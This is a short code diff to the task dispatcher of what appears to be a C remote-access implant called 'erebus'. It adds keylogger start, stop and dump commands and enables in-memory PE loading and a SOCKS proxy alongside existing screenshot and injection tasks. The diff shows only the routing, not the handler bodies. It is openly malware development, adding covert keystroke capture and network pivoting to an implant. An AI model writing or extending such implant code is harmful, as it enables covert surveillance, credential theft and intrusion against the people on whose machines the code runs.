@@ -60,6 +60,15 @@ erebus_task_result erebus_execute_task(const erebus_task *task) {
     case EREBUS_TASK_SCREENSHOT:
         run_handler(erebus_task_screenshot, task, &r);
         break;
+    case EREBUS_TASK_KEYLOG_START:
+        run_handler(erebus_task_keylog_start, task, &r);
+        break;
+    case EREBUS_TASK_KEYLOG_STOP:
+        run_handler(erebus_task_keylog_stop, task, &r);
+        break;
+    case EREBUS_TASK_KEYLOG_DUMP:
+        run_handler(erebus_task_keylog_dump, task, &r);
+        break;
     case EREBUS_TASK_INJECT:
         run_handler(erebus_task_inject, task, &r);
         break;
@@ -76,10 +85,13 @@ erebus_task_result erebus_execute_task(const erebus_task *task) {
         r.success = 1;
         break;
     case EREBUS_TASK_PE_LOAD:
+        run_handler(erebus_task_peload, task, &r);
+        break;
     case EREBUS_TASK_SOCKS_START:
+        run_handler(erebus_task_socks_start, task, &r);
+        break;
     case EREBUS_TASK_SOCKS_STOP:
-        snprintf(r.error, sizeof(r.error), "task type %d not yet implemented", task->task_type);
-        r.success = 0;
+        run_handler(erebus_task_socks_stop, task, &r);
         break;
     default:
         snprintf(r.error, sizeof(r.error), "unsupported task type: %d", task->task_type);
